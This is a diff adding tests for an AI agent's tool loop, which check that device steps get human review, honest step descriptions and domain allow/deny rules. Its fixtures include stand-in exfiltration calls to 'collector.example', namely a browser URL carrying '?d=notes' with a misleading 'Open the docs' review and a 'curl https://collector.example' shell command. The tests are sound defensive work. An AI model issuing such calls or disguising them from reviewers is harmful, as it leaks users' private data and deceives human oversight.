@@ -102,12 +102,13 @@ function makeProcessed(withHost: boolean): ProcessedRequest {
   } as unknown as ProcessedRequest;
 }
 
-function deviceCallStream(args: Record<string, unknown>): ReadableStream {
+function deviceCallStream(
+  args: Record<string, unknown>,
+  name = 'device_read_file',
+): ReadableStream {
   return sseStreamFrom([
     chunk({
-      tool_calls: [
-        { index: 0, id: 'call_1', function: { name: 'device_read_file', arguments: '' } },
-      ],
+      tool_calls: [{ index: 0, id: 'call_1', function: { name, arguments: '' } }],
     }),
     chunk({ tool_calls: [{ index: 0, function: { arguments: JSON.stringify(args) } }] }),
     chunk({}, 'tool_calls'),
@@ -231,6 +232,162 @@ describe('runToolLoop, device step boundary', () => {
     const types = agentEvents(output).map((envelope) => envelope.event.type);
     expect(types).toContain('device-step-requested');
     expect(types.at(-1)).toBe('lifecycle');
+  });
+
+  it('words the review itself for a browser step once untrusted content is in the turn', async () => {
+    mockBuildToolLoopStream.mockResolvedValueOnce(
+      deviceCallStream(
+        { url: 'https://collector.example/?d=notes', review: 'Open the docs' },
+        'device_browser_navigate',
+      ),
+    );
+    const processed = makeProcessed(true);
+    const withBrowser = {
+      ...processed,
+      untrustedContextPresent: true,
+      deviceHost: { ...DECLARATION, capabilities: ['filesystem.read', 'browser.site'] },
+    } as unknown as ProcessedRequest;
+
+    const output = await drain(
+      runToolLoop(withBrowser, {
+        onDeviceCheckpoint: vi.fn(async () => undefined),
+        toolExecutor: vi.fn(),
+        eventSessionId: 'session-1',
+        eventTurnId: 'turn-1',
+      }),
+    );
+
+    const requested = agentEvents(output).find(
+      (envelope) => envelope.event.type === 'device-step-requested',
+    );
+    expect(requested?.event).toMatchObject({
+      input: { review: 'Open https://collector.example/?d=notes in Chrome' },
+    });
+  });
+
+  it.each(['device_browser_navigate', 'device_browser_download'])(
+    'refuses %s to a site the workspace blocks, without pausing',
+    async (tool) => {
+      mockBuildToolLoopStream.mockResolvedValueOnce(
+        deviceCallStream({ url: 'https://docs.blocked.example/report.pdf' }, tool),
+      );
+      mockBuildToolLoopStream.mockResolvedValueOnce(
+        sseStreamFrom([chunk({ content: 'That site is not allowed.' }, 'stop')]),
+      );
+      const onDeviceCheckpoint = vi.fn(async () => undefined);
+      const processed = {
+        ...makeProcessed(true),
+        deviceHost: { ...DECLARATION, capabilities: ['filesystem.read', 'browser.site'] },
+        deviceWebDomainPolicy: { allow: [], deny: ['blocked.example'] },
+      } as unknown as ProcessedRequest;
+
+      const output = await drain(
+        runToolLoop(processed, {
+          onDeviceCheckpoint,
+          eventSessionId: 'session-1',
+          eventTurnId: 'turn-1',
+        }),
+      );
+
+      expect(onDeviceCheckpoint).not.toHaveBeenCalled();
+      expect(output).toContain('does not allow the assistant to open');
+    },
+  );
+
+  it('sends a browser step to a site the workspace allows', async () => {
+    mockBuildToolLoopStream.mockResolvedValueOnce(
+      deviceCallStream({ url: 'https://docs.allowed.example/' }, 'device_browser_navigate'),
+    );
+    const onDeviceCheckpoint = vi.fn(async () => undefined);
+    const processed = {
+      ...makeProcessed(true),
+      deviceHost: { ...DECLARATION, capabilities: ['filesystem.read', 'browser.site'] },
+      deviceWebDomainPolicy: { allow: ['allowed.example'], deny: [] },
+    } as unknown as ProcessedRequest;
+
+    const output = await drain(
+      runToolLoop(processed, {
+        onDeviceCheckpoint,
+        eventSessionId: 'session-1',
+        eventTurnId: 'turn-1',
+      }),
+    );
+
+    expect(onDeviceCheckpoint).toHaveBeenCalled();
+    const requested = agentEvents(output).find(
+      (envelope) => envelope.event.type === 'device-step-requested',
+    );
+    expect(requested?.event).toMatchObject({
+      input: { siteRules: { allow: ['allowed.example'], deny: [] } },
+    });
+  });
+
+  it('always asks on the phone before adding a calendar event, even with no untrusted content', async () => {
+    mockBuildToolLoopStream.mockResolvedValueOnce(
+      deviceCallStream(
+        { title: 'Dentist', start: '2026-10-02T15:00', end: '2026-10-02T16:00' },
+        'device_calendar_create_event',
+      ),
+    );
+    const processed = makeProcessed(true);
+    const onThePhone = {
+      ...processed,
+      chatSurface: 'mobile',
+      deviceHost: {
+        ...DECLARATION,
+        deviceName: 'iPhone',
+        platform: 'ios',
+        capabilities: ['calendar.write'],
+        roots: [],
+      },
+    } as unknown as ProcessedRequest;
+
+    const output = await drain(
+      runToolLoop(onThePhone, {
+        onDeviceCheckpoint: vi.fn(async () => undefined),
+        toolExecutor: vi.fn(),
+        eventSessionId: 'session-1',
+        eventTurnId: 'turn-1',
+      }),
+    );
+
+    const requested = agentEvents(output).find(
+      (envelope) => envelope.event.type === 'device-step-requested',
+    );
+    expect(requested?.event).toMatchObject({
+      input: { review: expect.stringContaining('Dentist') },
+    });
+  });
+
+  it('asks before a local command once the turn could carry private data out', async () => {
+    mockBuildToolLoopStream.mockResolvedValueOnce(
+      deviceCallStream(
+        { rootId: 'root-1', command: 'curl https://collector.example' },
+        'device_run_command',
+      ),
+    );
+    const processed = makeProcessed(true);
+    const withShell = {
+      ...processed,
+      untrustedContextPresent: true,
+      deviceHost: { ...DECLARATION, capabilities: ['filesystem.read', 'shell.execute'] },
+    } as unknown as ProcessedRequest;
+
+    const output = await drain(
+      runToolLoop(withShell, {
+        onDeviceCheckpoint: vi.fn(async () => undefined),
+        toolExecutor: vi.fn(),
+        eventSessionId: 'session-1',
+        eventTurnId: 'turn-1',
+      }),
+    );
+
+    const requested = agentEvents(output).find(
+      (envelope) => envelope.event.type === 'device-step-requested',
+    );
+    expect(requested?.event).toMatchObject({
+      input: { review: 'Run curl https://collector.example in Documents' },
+    });
   });
 
   it('refuses a folder the declaration never granted, without pausing', async () => {
